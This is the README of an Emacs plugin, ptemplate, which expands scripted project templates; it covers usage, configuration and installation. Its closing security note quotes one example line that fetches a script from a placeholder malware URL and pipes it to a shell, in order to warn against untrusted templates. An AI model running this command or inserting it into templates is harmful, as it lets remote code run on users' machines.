# About
Projects contain a lot of boilerplate like build system files, cask files,
license files, ..., making starting new projects more work than it needs to be.
The ptemplate Emacs plugin solves that problem: it lets you define directory
templates that can contain various files and directories, including yasnippets.
Such templates ("ptemplates") can even be made intelligent using Emacs Lisp.

# Usage
## Creating new projects
For helm users, run `ptemplate-new-project`. It will then prompt you to select a
template followed by a project directory. The templates are categorized in
types, which are either mapped to helm sections or to suffixes appended to
template names (see the "Configuration" section below).

# Writing templates
All templates are categorized into types, which are associated with workspace
directories using the variable `ptemplate-workspace-alist`. You could, for
example, have types corresponding to languages (so a Java type, a C++ type,
...). The corresponding workspace is used as the default folder in the project
directory selection. Templates are stored in `ptemplate-template-dirs`, a list
of directories containing templates, all of which must be categorized under type
directories as described above.

## Anatomy of a template
Each template has a nested directory structure, consisting of any number of
files and directories, which is replicated at the expansion target. Some files
(depending on their suffix) are expanded specially, and their extension is not
replicated:

### \*.yas
Files ending in .yas are yasnippets, which are expanded in a so-called snippet
chain: a list of all such files is gathered, after which a single buffer pops up
where the user can expand the first snippet like any regular yasnippet (TAB,
...). The following snippets can be visited similarly by pressing `C-c C-c`, at
which point the buffer is killed and written to the target. The following
keybindings are available in a snippet chain buffer:

#### `C-c C-c`: `ptemplate-snippet-chain-continue`
Finish expanding the current yasnippet by writing the current snippet buffer to
the correct destination and killing its buffer.

#### `C-C C-l`: `ptemplate-snippet-chain-later`
Mark the current snippet buffer to be expanded later and continue like
`ptemplate-snippet-chain-continue`. Unlike with `ptemplate-snippet-chain-next`,
the snippet buffer is not killed. You can use this keybinding to procrastinate
expansion of the current snippet and look at the others meantime.

The keybindings can be modified by customizing
`ptemplate-snippet-chain-mode-map`.

### \*.keep
.keep files are copied like normal files, but without the .keep extension. Name
files this way if you need to override ptemplate's special file handling for
some files (e.g. if you are writing templates for ptemplate templates).

### \*.nocopy
Such files are not copied at all. Empty directories cannot be added to git. This
way, an empty .gitkeep.nocopy file can be added in empty directories to make
them part of the template.

### .ptemplate.el
As stated in "About", ptemplate allows templates to be scripted with Emacs Lisp.
For this, you can add .ptemplate.el in the template's root directory, which is
evaluated before expansion. This file is not copied. Even though arbitrary lisp
code, executed in the main Emacs instance, can be contained within it, templates
should make use of the `ptemplate!` macro. It takes any number of keyword blocks
(akin to `use-package`) which are then expanded to the correct lisp code:

- :init FORMs to run before expansion
- :before-snippets FORMs to run before expanding yasnippets
- :after-copy FORMs to run after all files have been copied
- :finalize FORMs to run after expansion finishes.
- :snippet-env Variables to make available to yasnippets.
- :snippet-let Variables to let*-bind around the `ptemplate!` block + to add in
  yasnippets.
- :ignore Regular expressions of filenames to ignore or paths to ignore.
- :subdir Make some template directories appear as if they were in its root.

For details, see `M-x describe-function ptemplate!`.

Some other useful functions include:
- `ptemplate-map`: map one template file to some file in the target
- `ptemplate-remap`: remap template files
- `ptemplate-remap-rec`: recursively remap template directories
- `ptemplate-copy-target`: copy files from one target location to another
- `ptemplate-include`: add all files in DIRS as if they were part of the
  template, files mapped previously taking precedence
- `ptemplate-include-override`: like the above, but files in DIRS take
  precedence
- `ptemplate-target`: make a path from expansion target + dir
- `ptemplate-source`: make a path from template directory + dir

# Configuration
## ptemplate-template-prompt-function
This variable specifies which function to use for prompting templates. It can be
a custom function, or one of the builtin ones (see its docstring for details).
By default it prompts templates using completing-read, and their types appended
in parentheses. There is also a builtin function available to use separate helm
sections (sources) instead:

```emacs-lisp
(setq ptemplate-prompt-template-completing-read
      #'ptemplate-prompt-template-helm)
```

## ptemplate-workspace-alist
Maps template types to workspaces. When a new project is created, the type is
looked up in this alist and the directory mapped is suggested as the default
target, in which another directory may be specified for expansion. If the type
is not associated, use `ptemplate-default-workspace`, or the current buffer's
`default-directory` if even that is nil.

## ptemplate-default-workspace
See above.

## ptemplate-template-dirs
List of directories in which templates are looked up. Each directory specified
shall consist of a number of subdirectories (corresponding to types) each of
which have separate subdirectories for templates (template names).

# Installation
This package is not yet on `MELPA`. However, you can install it using any
package manager/fetcher that can handle GitHub repositories:

## `quelpa` + `use-package`
``` emacs-lisp
(quelpa '(ptemplate :fetcher github :repo "nbfalcon/ptemplate"))
(use-package ptemplate)
```

## `quelpa-use-package`
``` emacs-lisp
(use-package ptemplate
  :quelpa (ptemplate :fetcher github :repo "nbfalcon/ptemplate"))
```

## `straight-use-package`
``` emacs-lisp
(straight-use-package
 '(ptemplate :type git :host github :repo "nbfalcon/ptemplate"))
```

# Security note
Due to the smart expansion feature, and due to allowing yasnippets in templates,
ptemplate is *not* secure. You should use only trusted templates. A malicious
template could have a snippet like the following in its .ptemplate.el or in a
\`\` block of one of its yasnippets:

```emacs-lisp
(shell-command "wget $SH_MALWARE_URL | sh")
```

At that point, all security would be lost: the malicious shell script could nuke
your home directory, implant a .profile-based rootkit, modify user-owned
software, .... The possibilities are endless.
